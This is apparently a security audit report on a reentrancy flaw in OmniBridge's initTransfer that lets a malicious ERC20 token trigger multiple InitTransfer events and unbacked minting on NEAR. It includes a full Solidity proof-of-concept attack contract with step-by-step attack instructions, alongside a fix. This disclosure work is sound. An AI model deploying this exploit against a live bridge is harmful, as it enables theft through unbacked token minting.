### Title
Reentrancy in `initTransfer` via Malicious ERC20 `transferFrom` Callback Allows Minting Unbacked Tokens on NEAR — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

### Summary

`OmniBridge.initTransfer` makes an external call to an attacker-controlled ERC20 token's `transferFrom` before emitting the `InitTransfer` event and publishing the Wormhole message. No reentrancy guard is present. A malicious token can re-enter `initTransfer` during the `safeTransferFrom` callback, generating multiple unique-nonce `InitTransfer` events (and Wormhole messages) for a single (or zero) actual token lock. The NEAR bridge treats every emitted event as proof that tokens are held, so each re-entrant event causes NEAR to mint tokens — resulting in unbacked minting of bridged assets.

### Finding Description

`initTransfer` increments `currentOriginNonce` at line 381 before the external call, which is correct for replay prevention. However, the `InitTransfer` event emission (line 427) and `initTransferExtension` call (line 415) — which publishes the Wormhole message on `OmniBridgeWormhole` — both occur **after** the external call to the token contract at lines 395–412. [1](#0-0) 

For the non-bridge, non-custom-minter path (the `else` branch), the call is:

```solidity
IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount);
``` [2](#0-1) 

`tokenAddress` is fully attacker-controlled. A malicious ERC20's `transferFrom` can call back into `initTransfer` before returning. Each re-entrant call:
1. Increments `currentOriginNonce` to a new unique value (N+1, N+2, …)
2. Calls `safeTransferFrom` again on the malicious token (which returns `true` without moving tokens)
3. Calls `initTransferExtension` — publishing a Wormhole VAA with the new nonce on `OmniBridgeWormhole`
4. Emits `InitTransfer` with the new nonce [3](#0-2) 

After all re-entrant frames unwind, the original call also completes its `initTransferExtension` and `InitTransfer` emission. The result is N+1 distinct, valid-looking cross-chain transfer proofs for a single (or zero) actual token lock.

The project's own security invariant explicitly forbids this:

> **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held. [4](#0-3) 

No `ReentrancyGuardUpgradeable` or equivalent is imported or applied anywhere in `OmniBridge` or `SelectivePausableUpgradable`. [5](#0-4) 

### Impact Explanation

The NEAR bridge's `fin_transfer` processes each `InitTransfer` event (verified via Merkle proof on Ethereum, or Wormhole VAA on L2 chains) and mints the stated `amount` of the corresponding NEAR token to the stated recipient. Because each re-entrant call produces a unique `originNonce`, the NEAR nonce-deduplication map does not block any of them. The attacker receives N×`amount` tokens on NEAR while locking at most 1×`amount` (or zero) tokens on EVM — a direct, unbounded unauthorized minting of bridged assets and permanent loss of peg integrity for the affected token.

### Likelihood Explanation

The attack entry point is the public, unpermissioned `initTransfer` function. Any user can supply any ERC20 `tokenAddress`. The only prerequisite is that the malicious token's metadata has been logged via `logMetadata` (also permissionless) so that the NEAR bridge has deployed a corresponding NEAR token. Both steps are fully within reach of an unprivileged attacker with no admin access, no private key compromise, and no external dependency beyond deploying a malicious ERC20. [6](#0-5) 

### Recommendation

Apply OpenZeppelin's `ReentrancyGuardUpgradeable` and add the `nonReentrant` modifier to `initTransfer` and `initTransfer1155`. Alternatively, follow the Checks-Effects-Interactions pattern strictly: emit `InitTransfer` and call `initTransferExtension` **before** the external token call. The project's own stated defense ("State before external calls") must be extended to cover event emission and Wormhole publishing, not only nonce mutation. [7](#0-6) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IOmniBridge {
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousToken {
    IOmniBridge public bridge;
    address public attacker;
    uint8 public reentryCount;
    uint8 public maxReentry = 3; // mint 4x tokens for 0 actual locks

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
        attacker = msg.sender;
    }

    // Standard ERC20 stubs
    function name() external pure returns (string memory) { return "Evil"; }
    function symbol() external pure returns (string memory) { return "EVIL"; }
    function decimals() external pure returns (uint8) { return 18; }
    function balanceOf(address) external pure returns (uint256) { return type(uint256).max; }
    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }
    function approve(address, uint256) external pure returns (bool) { return true; }

    // Reentrancy hook: called by OmniBridge.safeTransferFrom
    function transferFrom(address, address, uint256) external returns (bool) {
        if (reentryCount < maxReentry) {
            reentryCount++;
            // Re-enter initTransfer — gets a fresh unique nonce each time
            bridge.initTransfer(address(this), 1e18, 0, 0, "attacker.near", "");
        }
        return true; // never actually moves tokens
    }
}

// Attack steps:
// 1. Deploy MaliciousToken(bridgeAddress)
// 2. Call bridge.logMetadata(maliciousToken) — permissionless
// 3. Wait for NEAR relayer to deploy corresponding NEAR token
// 4. Call bridge.initTransfer(maliciousToken, 1e18, 0, 0, "attacker.near", "")
//    → transferFrom re-enters 3 times → 4 InitTransfer events with nonces N, N+1, N+2, N+3
//    → 0 tokens actually locked on EVM
//    → NEAR mints 4 × 1e18 tokens to attacker.near
``` [8](#0-7)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L224-232)
```text
    function logMetadata(address tokenAddress) external payable {
        string memory name = IERC20Metadata(tokenAddress).name();
        string memory symbol = IERC20Metadata(tokenAddress).symbol();
        uint8 decimals = IERC20Metadata(tokenAddress).decimals();

        logMetadataExtension(tokenAddress, name, symbol, decimals);

        emit BridgeTypes.LogMetadata(tokenAddress, name, symbol, decimals);
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L373-437)
```text
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        uint256 extensionValue;
        if (tokenAddress == address(0)) {
            if (fee != 0) {
                revert InvalidFee();
            }
            extensionValue = msg.value - amount - nativeFee;
        } else {
            extensionValue = msg.value - nativeFee;
            if (customMinters[tokenAddress] != address(0)) {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    customMinters[tokenAddress],
                    amount
                );
                ICustomMinter(customMinters[tokenAddress]).burn(
                    tokenAddress,
                    amount
                );
            } else if (isBridgeToken[tokenAddress]) {
                BridgeToken(tokenAddress).burn(msg.sender, amount);
            } else {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    address(this),
                    amount
                );
            }
        }

        initTransferExtension(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridgeWormhole.sol (L118-150)
```text
    function initTransferExtension(
        address sender,
        address tokenAddress,
        uint64 originNonce,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message,
        uint256 value
    ) internal override {
        bytes memory payload = bytes.concat(
            bytes1(uint8(MessageType.InitTransfer)),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(sender),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(tokenAddress),
            Borsh.encodeUint64(originNonce),
            Borsh.encodeUint128(amount),
            Borsh.encodeUint128(fee),
            Borsh.encodeUint128(nativeFee),
            Borsh.encodeString(recipient),
            Borsh.encodeString(message)
        );
        // slither-disable-next-line reentrancy-eth
        _wormhole.publishMessage{value: value}(
            wormholeNonce,
            payload,
            _consistencyLevel
        );

        wormholeNonce++;
    }
```

**File:** evm/CLAUDE.md (L34-34)
```markdown
- **State before external calls**: Always mutate state (e.g. mark nonce used) before any external call (token transfer, ETH send, custom minter). This is the primary reentrancy defense
```

**File:** evm/CLAUDE.md (L36-36)
```markdown
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
```

**File:** evm/src/omni-bridge/contracts/SelectivePausableUpgradable.sol (L17-20)
```text
abstract contract SelectivePausableUpgradable is
    Initializable,
    ContextUpgradeable
{
```
